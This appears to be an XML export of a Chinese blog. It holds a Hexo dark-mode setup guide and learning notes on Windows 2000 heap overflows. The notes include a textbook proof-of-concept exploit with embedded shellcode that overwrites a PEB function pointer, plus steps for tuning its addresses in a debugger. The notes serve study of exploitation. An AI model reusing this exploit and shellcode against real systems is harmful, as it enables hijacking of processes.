<p>0day书中图5.2.20标注的Lookaside[1], Lookaside[2], Lookaside[3]分别位于0x6E8 0x718 0x748，书中的标注有误。</p>
</blockquote>
<p>运行之后的代码，C代码中的新h2需要16 Byte空间，加上块首，需占 (2+1) x 8 Byte空间，因此在分配时已被链入Lookaside[3]的之前h3的内存0x1EB0将被新h2所使用，0x718处的指针在分配完毕后将被置0，在新h2被释放后该处指针又会恢复，整个过程较为简单，不再赘述。</p>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Learning Notes</tag>
        <tag>Bin</tag>
        <tag>Heap Overflow</tag>
        <tag>OllyDBG</tag>
        <tag>Security</tag>
        <tag>Windows</tag>
        <tag>Windows 2000</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo（Next主题）实现可切换的Dark Mode(暗色背景/夜间模式)</title>
    <url>/tech/hexo-dark-mode-note/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Hexo Dark Mode Note</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr>
<blockquote>
<p>Dark Mode —— 中老年程序🐶的眼睛续命必备功能</p>
</blockquote>
<p>Mac、Win 纷纷推出了 Dark Mode，安卓也原生支持了随着夜幕降临自动调整屏幕亮度（蓝光）的功能，看来保护眼睛、关爱程序猿是大势所趋。</p>
<p>这里，我们尝试了3种使Hexo Next主题切换为darkmode的方式。</p>
<a id="more"></a>

<h1 id="方案1：官方最新版Next"><a href="#方案1：官方最新版Next" class="headerlink" title="方案1：官方最新版Next"></a>方案1：官方最新版Next</h1><p>Next在最近的几个版本的更新中<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZW1lLW5leHQvaGV4by10aGVtZS1uZXh0L3B1bGwvMTM4Ng==">加入了对darkmode的原生支持<i class="fa fa-external-link-alt"></i></span>，配置非常简单。</p>
<ul>
<li>配置方法：参见 <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0Lm9yZy9kb2NzL2dldHRpbmctc3RhcnRlZC9pbmRleC5odG1sI0RhcmstTW9kZQ==">官方文档<i class="fa fa-external-link-alt"></i></span>和<span class="exturl" data-url="aHR0cHM6Ly9zaXJpdXNxLnRvcC9OZXh0JUU1JThEJTg3JUU3JUJBJUE3LU1hYyVFOCVCRiU4MSVFNyVBNyVCQi5odG1sI0Rhcmttb2Rl">大佬们的文章<i class="fa fa-external-link-alt"></i></span></li>
<li>优点：配置非常简单</li>
<li>缺点：<ul>
<li>根据自己的测试，Safari和Firefox 没有问题，但是Chrome无效</li>
<li>不能进行切换，而是根据系统偏好（是否是夜间模式）来判断 是否启用</li>
</ul>
</li>
</ul>
<h1 id="方案2：hexo-next-nightmode插件"><a href="#方案2：hexo-next-nightmode插件" class="headerlink" title="方案2：hexo-next-nightmode插件"></a>方案2：hexo-next-nightmode插件</h1><ul>
<li>配置方法：请参见<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzF2OS9oZXhvLW5leHQtbmlnaHRtb2Rl">官方说明<i class="fa fa-external-link-alt"></i></span></li>
<li>优点：可以切换，配置相对简单</li>
<li>缺点：<ul>
<li>需要额外安装插件</li>
<li>开启后会在侧边栏的个人信息一览(Overview)里添加切换黑白背景的按钮，但是 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzF2OS9oZXhvLW5leHQtbmlnaHRtb2RlL2lzc3Vlcy8xMA==">当前版本没有默认使用暗色背景的选项<i class="fa fa-external-link-alt"></i></span></li>
<li>默认切换按钮在Overview里，可能会有如下弊端<ul>
<li>如果设置为默认隐藏侧边栏，则用户首次访问首页时，不知道有夜间模式</li>
<li>在文章页面时，侧边栏是有两个标签组成，默认显示文章大纲。因此只有切换至Overview后才能后点击背景切换按钮</li>
</ul>
</li>
<li>bug：darkmode下，header位置被选中的category背景色变成了蓝色</li>
</ul>
</li>
</ul>
<h1 id="方案3：引入js库-darkmode-js"><a href="#方案3：引入js库-darkmode-js" class="headerlink" title="方案3：引入js库 darkmode.js"></a>方案3：引入js库 <code>darkmode.js</code></h1><h2 id="缘由（非重点可略过）"><a href="#缘由（非重点可略过）" class="headerlink" title="缘由（非重点可略过）"></a>缘由（非重点可略过）</h2><p>从<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZW1lLW5leHQvaGV4by10aGVtZS1uZXh0L3B1bGwvMTM4Ng==">Next加入了对darkmode的原生支持的PR页面的讨论<i class="fa fa-external-link-alt"></i></span>可以看到，在某大佬X向Next官方贡献了原生darkmode的代码后，某网友向其呼吁加一步加上切换按钮。</p>
<p>但大佬X似乎不打算加，并表示该网友可以使用js库 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NhbmRvY2hlL0Rhcmttb2RlLmpz">darkmode.js<i class="fa fa-external-link-alt"></i></span> 去实现。</p>
<p>没想到网友其实是大佬Y，果然在<span class="exturl" data-url="aHR0cHM6Ly95dXpob3V3YW4uY29tLw==">自己的博客<i class="fa fa-external-link-alt"></i></span>成功集成了darkmode.js。</p>
<p>于是另一位网友向大佬Y询问如何集成的具体细节，但是没有得到回应。</p>
<p>既然可行，那就不妨尝试一下，我也按照<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NhbmRvY2hlL0Rhcmttb2RlLmpz">darkmode.js官方的说明<i class="fa fa-external-link-alt"></i></span>操作一番，其中也遇到了些小问题：</p>
<ul>
<li>切换按钮无法点击</li>
<li>切换到夜间模式后，所有图片的颜色也被翻转，这不是我们所期望的</li>
</ul>
<p>为解决这些问题，参考了<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NhbmRvY2hlL0Rhcmttb2RlLmpzL2lzc3Vlcy80">官方相关issue<i class="fa fa-external-link-alt"></i></span>，并且抄了<span class="exturl" data-url="aHR0cHM6Ly95dXpob3V3YW4uY29tLw==">大佬Y的作业<i class="fa fa-external-link-alt"></i></span>。</p>
<h2 id="为Next订制darkmode-js"><a href="#为Next订制darkmode-js" class="headerlink" title="为Next订制darkmode.js"></a>为Next订制darkmode.js</h2><p>可以参考这里我fork的next对比具体做了哪些配置和修改：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hleG8tdGhlbWUtbmV4dA==">dog-2/hexo-theme-next<i class="fa fa-external-link-alt"></i></span></p>
<p>最终效果图见文章最后，下面是具体步骤：</p>
<h3 id="1-加darkmode-js添加为Next的submodule"><a href="#1-加darkmode-js添加为Next的submodule" class="headerlink" title="1. 加darkmode.js添加为Next的submodule"></a>1. 加darkmode.js添加为Next的submodule</h3><p>.gitignore 最后添加</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">!<span class="built_in">source</span>/lib/darkmode-js</span><br></pre></td></tr></table></figure>

<p>进入 <code>{blog_dir}/themes/next/</code>，执行如下命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git submodule add https://github.com/sandoche/Darkmode.js.git <span class="built_in">source</span>/lib/darkmode-js/</span><br></pre></td></tr></table></figure>

<h3 id="2-根据偏好修改配置文件"><a href="#2-根据偏好修改配置文件" class="headerlink" title="2. 根据偏好修改配置文件"></a>2. 根据偏好修改配置文件</h3><p>根据偏好修改下列配置文件中的其它选项</p>
<ul>
<li>{blog_dir}/themes/next/languages/en.yml</li>
<li>next配置文件中的配置</li>
</ul>
<div class="note warning">
            <p>这里需要注意的是next有两种配置文件的形式，请确认自己是哪一种。<br>新Next的配置文件，有2种设置方式，请参考官方文档：</p><ul><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZW1lLW5leHQvaGV4by10aGVtZS1uZXh0L2Jsb2IvbWFzdGVyL2RvY3MvemgtQ04vREFUQS1GSUxFUy5tZA==">官方中文<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0Lm9yZy9kb2NzL2dldHRpbmctc3RhcnRlZC9jb25maWd1cmF0aW9u">官方英文<i class="fa fa-external-link-alt"></i></span></li></ul>
          </div>

<h3 id="3-定制vendors加入darkmode-js"><a href="#3-定制vendors加入darkmode-js" class="headerlink" title="3. 定制vendors加入darkmode.js"></a>3. 定制vendors加入darkmode.js</h3><ol>
<li>修改 <code>{blog_dir}/themes/next/layout/_scripts/vendors.swig</code></li>
<li>修改next配置文件中的针对darkmode以及darkmode-js的配置：<ul>
<li>确保next原有<code>darkmode</code>选项设置为 <code>false</code></li>
<li>添加darkmode-js开关</li>
<li>添加darkmode-js自定义CDN选项（可选）</li>
</ul>
</li>
</ol>
<h1 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h1><img data-src="/tech/hexo-dark-mode-note/1.gif" class="" title="darkmode.js效果">]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Tech</tag>
        <tag>Hexo</tag>
        <tag>Hexo Next</tag>
        <tag>Blog</tag>
      </tags>
  </entry>
  <entry>
    <title>堆溢出学习笔记(Win2K) (下)</title>
    <url>/tech/heap-overflow-learning-notes-2/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Heap Overflow Learning Notes(Win2K) #2</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr>
<h2 id="堆溢出原理及利用"><a href="#堆溢出原理及利用" class="headerlink" title="堆溢出原理及利用"></a>堆溢出原理及利用</h2><hr>
<h3 id="1-堆溢出原理"><a href="#1-堆溢出原理" class="headerlink" title="1. 堆溢出原理"></a>1. 堆溢出原理</h3><blockquote><p>堆管理系统的三类操作：堆块分配、堆块释放和堆块合并归根结底都是堆链表的修改。例如，分配就是将堆块从空表中“卸下”；释放是把堆块“链入”空表；合并稍微复杂点，但也可以看成是把若干个堆块先从空表中“卸下”，修改块首信息（大小），之后把更新的新块“链入”空表。</p>
<p>所有“卸下”和“链入”堆块的工作都发生在链表，如果我们能伪造链表结点的指针，在“卸下”和“链入”的过程中就有可能获得一次读写内存的机会。</p>
<p>堆溢出利用的精髓就是用精心构造的数据去溢出下一个堆块的块首，改写块首中的前向指针(flink)和后向指针(blink)，然后再分配、释放、合并等操作发生时伺机获得一次向内存任意地址写入任意数据的机会。</p>
<p>我们把这种能够向内存任意位置写入任意数据的机会成为”DWORD SHOOT“。注意：DWORD SHOOT发生时，我们不但可以控制射击的目标（任意地址），还可以选用适当的子弹（4字节恶意数据）。</p>
<p>这里举一个例子来说明链表操作中DWORD SHOOT究竟是怎样发生的。将一个结点从双向链表中“卸下”的函数很可能是类似这样的。</p>
</blockquote>

<a id="more"></a>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">remove</span> <span class="params">(ListNode * node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	node -&gt; <span class="built_in">blink</span> -&gt; flink = node -&gt; flink;</span><br><span class="line">	node -&gt; flink -&gt; <span class="built_in">blink</span> = node -&gt; <span class="built_in">blink</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote><p>按照这个函数的逻辑，正常拆卸过程中链表的变化过程如图5.3.1所示。</p>
<p>当堆溢出发生时，非法数据可以淹没下一个堆块块首。这是，块首是可以被攻击者控制的，即块首中存放的前向指针（flink）和后向指针（blink）是可以被攻击者伪造的。当这个堆块被从双向链表中”卸下“时，node -&gt; blink -&gt; flink = node -&gt; flink 将把伪造的flink指针值写入伪造的blink所指的地址中去，从而发生DWORD SHOOT。这个过程如图5.3.2所示。</p>
<footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P163-164</cite></footer></blockquote>

<img data-src="/tech/heap-overflow-learning-notes-2/0day_5_3_1.png" class="" title="《0day安全：软件漏洞分析技术》(第二版) -&gt; P165 -&gt; 图5.3.1">

<img data-src="/tech/heap-overflow-learning-notes-2/0day_5_3_2.png" class="" title="《0day安全：软件漏洞分析技术》(第二版) -&gt; P165 -&gt; 图5.3.2">

<h3 id="2-堆溢出利用"><a href="#2-堆溢出利用" class="headerlink" title="2. 堆溢出利用"></a>2. 堆溢出利用</h3><blockquote><p>DWORD SHOOT的常用目标（Windows XP SP1之前的平台）大概可以概括为以下几类。</p>
<p>(1) 内存变量：修改能够影响程序执行的重要标志变量，往往可以改变程序流程。例如，更改身份验证函数的返回值就可以直接通过认证机制。2.2节中修改邻接变量的小试验就是这种利用方式的例子。在这种应用场景中，DWORD SHOOT要比栈溢出强大得多，因为栈溢出时溢出的数据必须连续，而DWORD SHOOT可以更改内存中任意地址的数据。</p>
<p>(2) 代码逻辑：修改代码段重要函数的关键逻辑有时可以达到一定攻击效果。例如，程序分支处的判断逻辑，或者把身份认证函数的调用指令覆盖为0x90(nop)。这种方法有点类似于软件破解技术中的”爆破“——通过更改一个字节而改变整个程序的流程，第1章中的破解小试验就是这种应用的例子。</p>
<p>(3) 函数返回地址：栈溢出修改函数返回地址能够劫持进程，堆溢出也一样可以利用DWORD SHOOT更改函数返回地址。但由于栈帧移位的原因，函数返回地址往往是不固定的。甚至在同一操作系统和补丁版本下连续运行两次栈状态都会有不同，故DWORD SHOOT在这种情况下有一定局限性，因为移动的靶子不好瞄准。</p>
<p>(4) 攻击异常处理机制：当程序产生异常时，Windows会转入异常处理机制。堆溢出很容易引起异常，因此异常处理机制所使用的重要数据结构往往会成为DWORD SHOOT的上等目标，这包括S.E.H（structure exception handler）、F.V.E.H（First Vectored Exception Handler）、进程环境块（P.E.B）中的U.E.F（Unhandled Exception Filter）、线程环境块（T.E.B）中存放的第一个S.E.H指针（T.E.H）。</p>
<p>(5) 函数指针：系统有时会使用一些函数指针，比如调用动态链接库中的函数、C++中的虚函数调用等。改写这些函数指针后，在函数调用发生后往往可以成功劫持进程。但可惜的是，不是每一个漏洞都可以使用这项技术，这取决于软件的开发方式。</p>
<p>(6) P.E.B中线程同步函数的入口地址：天才的黑客们发现在每个进程的P.E.B中都存放着一对同步函数指针，指向RtlEnterCriticalSection()和RtlLeaveCriticalSection()，并且在进程退出时会被ExitProcess()调用。如果能够通过DWORD SHOOT修改这对指针中的其中一个，那么在程序退出时ExitProcess()将会被骗去调用我们的shellcode。由于P.E.B的位置始终不会变化，这对指针在P.E.B中的偏移也始终不变，这使得利用堆溢出开发出适用于不同操作系统版本和补丁版本的exploit成为可能。这种方法一经提出就立刻成为Windows平台下堆溢出哭一边给的是最经典方法之一，因为静止的靶子比活动的靶子好打得多，我们只需要把枪架好，闭着眼睛扣扳机就是了。</p>
<footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P169-170</cite></footer></blockquote>

<h4 id="1-利用P-E-B（进程环境块）实施攻击"><a href="#1-利用P-E-B（进程环境块）实施攻击" class="headerlink" title="(1) 利用P.E.B（进程环境块）实施攻击"></a>(1) 利用P.E.B（进程环境块）实施攻击</h4><h5 id="1-P-E-B利用原理"><a href="#1-P-E-B利用原理" class="headerlink" title="1) P.E.B利用原理"></a>1) P.E.B利用原理</h5><blockquote><p>Windows为了同步进程下的多个线程，使用了一些同步措施，如锁机制（lock）、信号量（semaphore）、临界区（critical section）等。许多操作都要用到这些同步机制。</p>
<p>当进程退出时，ExitProcess()函数要做很多善后工作，其中必然需要用到临界区函数RtlEnterCriticalSection()和RtlLeaveCriticalSection()来同步线程防止“脏数据”的产生。</p>
<p>不知什么原因，微软的工程师似乎堆ExitProcess()情有独钟，因为它调用临界区的方法比较特殊，是通过进程环境块P.E.B中偏移0x20处存放的函数指针来间接完成的。具体说来就是在0x7FFDF020处存放着指向RtlEnterCriticalSection()的指针，在0x7FFDF024处存放着指向RtlLeaveCriticalSection()的指针。</p>
<p><em><strong>题外话：从Windows 2003 Server开始，微软已经修改了这里的实现。</strong></em></p>
<footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P170</cite></footer></blockquote>

<h5 id="2-实验"><a href="#2-实验" class="headerlink" title="2) 实验"></a>2) 实验</h5><p>本实验通过淹没尾块块首，来触发DWORD SHOOT以修改P.E.B中0x20处存放的指向RtlEnterCriticalSection()函数的指针，导致程序需要调用它时实际却执行了shellcode。</p>
<p>实验代码如下:</p>
<figure class="highlight c"><figcaption><span>《0day安全：软件漏洞分析技术》(第二版) -> P171 -> heap_PEB.c</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">/*****************************************************************************</span></span><br><span class="line"><span class="comment">      To be the apostrophe which changed "Impossible" into "I'm possible"!</span></span><br><span class="line"><span class="comment">		</span></span><br><span class="line"><span class="comment">POC code of chapter 6.4 in book "Vulnerability Exploit and Analysis Technique"</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">file name	: heap_PEB.c</span></span><br><span class="line"><span class="comment">author		: failwest  </span></span><br><span class="line"><span class="comment">date		: 2007.04.04</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">description	: demo show of heap overrun, shellcode was executed</span></span><br><span class="line"><span class="comment">			  function pointer of RtlEnterCriticalSection was changed in PEB</span></span><br><span class="line"><span class="comment">			  via DWORD shooting</span></span><br><span class="line"><span class="comment">			  Some address may need to reset via run time debugging</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Noticed		:	1 only run on windows 2000</span></span><br><span class="line"><span class="comment">				2 complied with VC 6.0</span></span><br><span class="line"><span class="comment">				3 build into release version</span></span><br><span class="line"><span class="comment">				4 used for run time debugging</span></span><br><span class="line"><span class="comment">version		: 1.0</span></span><br><span class="line"><span class="comment">E-mail		: failwest@gmail.com</span></span><br><span class="line"><span class="comment">		</span></span><br><span class="line"><span class="comment">	Only for educational purposes    enjoy the fun from exploiting :)</span></span><br><span class="line"><span class="comment">******************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">char shellcode[]=</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";//200 bytes 0x90</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">char shellcode[]=</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="comment">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="comment">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="comment">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span></span><br><span class="line"><span class="comment">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span></span><br><span class="line"><span class="comment">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span></span><br><span class="line"><span class="comment">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span></span><br><span class="line"><span class="comment">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span></span><br><span class="line"><span class="comment">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span></span><br><span class="line"><span class="comment">"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"</span></span><br><span class="line"><span class="comment">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x16\x01\x1A\x00\x00\x10\x00\x00"// head of the ajacent free block</span></span><br><span class="line"><span class="comment">"\x88\x06\x52\x00\x20\xf0\xfd\x7f";</span></span><br><span class="line"><span class="comment">//0x00520688 is the address of shellcode in first heap block </span></span><br><span class="line"><span class="comment">//0x7ffdf020 is the position in PEB which hold a pointer to RtlEnterCriticalSection()</span></span><br><span class="line"><span class="comment">//and will be called by ExitProcess() at last</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> shellcode[]=</span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">//repaire the pointer which shooted by heap over run</span></span><br><span class="line"><span class="string">"\xB8\x20\xF0\xFD\x7F"</span>  <span class="comment">//MOV EAX,7FFDF020</span></span><br><span class="line"><span class="string">"\xBB\x4C\xAA\xF8\x77"</span>  <span class="comment">//MOV EBX,77F8AA4C the address here may releated to your OS</span></span><br><span class="line"><span class="string">"\x89\x18"</span>				<span class="comment">//MOV DWORD PTR DS:[EAX],EBX</span></span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="string">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span></span><br><span class="line"><span class="string">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span></span><br><span class="line"><span class="string">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span></span><br><span class="line"><span class="string">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span></span><br><span class="line"><span class="string">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span></span><br><span class="line"><span class="string">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span></span><br><span class="line"><span class="string">"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"</span></span><br><span class="line"><span class="string">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x16\x01\x1A\x00\x00\x10\x00\x00"</span><span class="comment">// head of the ajacent free block</span></span><br><span class="line"><span class="string">"\x88\x06\x52\x00\x20\xf0\xfd\x7f"</span>;</span><br><span class="line"><span class="comment">//0x00520688 is the address of shellcode in first heap block, you have to make sure this address via debug </span></span><br><span class="line"><span class="comment">//0x7ffdf020 is the position in PEB which hold a pointer to RtlEnterCriticalSection()</span></span><br><span class="line"><span class="comment">//and will be called by ExitProcess() at last</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	HLOCAL h1 = <span class="number">0</span>, h2 = <span class="number">0</span>;</span><br><span class="line">	HANDLE hp;</span><br><span class="line">	hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">200</span>);</span><br><span class="line">	<span class="comment">//__asm int 3 //used to break the process</span></span><br><span class="line">	<span class="comment">//memcpy(h1,shellcode,200); //normal cpy, used to watch the heap</span></span><br><span class="line">	<span class="built_in">memcpy</span>(h1,shellcode,<span class="number">0x200</span>); <span class="comment">//overflow,0x200=512</span></span><br><span class="line">	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译环境如下：</p>
<ul>
<li>操作系统：运行于Vmware虚拟机，版本Win 2K SP4 5.00.2195 EN</li>
<li>编译器：Visual C++ 6.0</li>
<li>编译选项：默认选项</li>
<li>build版本：release版</li>
</ul>
<p>代码中第3个为最终版本的shellcode，这个shellcode效果是执行MessageBoxA()弹出一个对话框，但据0day书中解释，shellcode中调用的函数也需要使用临界区，因此在其执行过程中也需要调用P.E.B中0x20偏移处的指针指向的RtlEnterCriticalSection()函数，但该处的函数指针在shellcode执行时已经被我们掉包，因此会导致shellcode中的函数执行不成功。为了避免这个问题，需要在shellcode调用关键函数前修复该处的值，shellcode中77-79行的代码就是进行修复工作的。</p>
<p>首先，去掉代码104行处的注释，通过INT 3中断进入OllyDBG进行调试。</p>
<p>由于RtlEnterCriticalSection()函数的实际地址在不同操作系统上有所差异，因此此处需要手动确定，由于P.E.B的地址是固定的，为0x7FFDF000，因此在内存查看窗口中通过Ctrl+G并键入0x7FFDF020来到其偏移0x20处观察，得到在我的系统中RtlEnterCriticalSection()函数的地址为0x77F82060，因此将shellcode中78行处的修复代码中的该函数地址进行修改，本行整体改为”\xBB\x60\x20\xF8\x77”，其中\xBB为MOV EBX的机器码。</p>
<p>接着，观察shellcode中第92行，0day书中尾块的地址为0x00520688，而我的机器上为0x00360688，因此将其中的\x52修改为\x36即可。</p>
<p>最后，再将第104行的INT 3中断注释掉，重新编译运行程序，即可成功弹窗。这里有个问题，如果不注释掉该行代码，INT 3中断后进入OllyDBG进行调试，最终程序会终止在ntdll的内核代码中，不会成功弹窗，也不会执行到我们的shellcode，我尝试了很多修改选项或者不同断点的方式都无法解决这个问题，由于它不影响我们对利用P.E.B进行堆溢出利用的理解，因此放在后面讨论。</p>
<h5 id="3-关于其中细节的思考"><a href="#3-关于其中细节的思考" class="headerlink" title="3) 关于其中细节的思考"></a>3) 关于其中细节的思考</h5><p>虽然无法跟踪调试堆溢出的过程，但是我们可以观察一下堆溢出之前的堆内存的分布，当代码执行到106行memcpy()调用之前时，观察空表索引区，如下图：</p>
<img data-src="/tech/heap-overflow-learning-notes-2/2_2_1_1.png" class="" title="图2.2.1.1">

<p>观察堆数据区：</p>
<img data-src="/tech/heap-overflow-learning-notes-2/2_2_1_2.png" class="" title="图2.2.1.2">

<p>可以看到尾块的前后向指针均指向0x178处的Freelist[0]。</p>
<p>接着执行代码到完成106行的memcpy操作，再观察对数据区：</p>
<img data-src="/tech/heap-overflow-learning-notes-2/2_2_1_3.png" class="" title="图2.2.1.3">

<p>由于h1处发生溢出，0x688处写入的shellcode会越界覆盖到0x758处的尾块的前后向指针，前向指针flink被修改为0x00360688，后向指针blink被修改为0x7FFDF020。由于当前尾块与Freelist[0]相互串接，而h2会申请(1+1) x 8 Byte的空间，当前Freelist[2]中没有空闲块，因此会从尾块中”分割“所需空间给h2，这需要将当前尾块从Freelist[0]中”卸下“，而前面的堆溢出利用原理中介绍过，将一个结点从双向链表中“卸下”的函数很可能是类似这样的：</p>
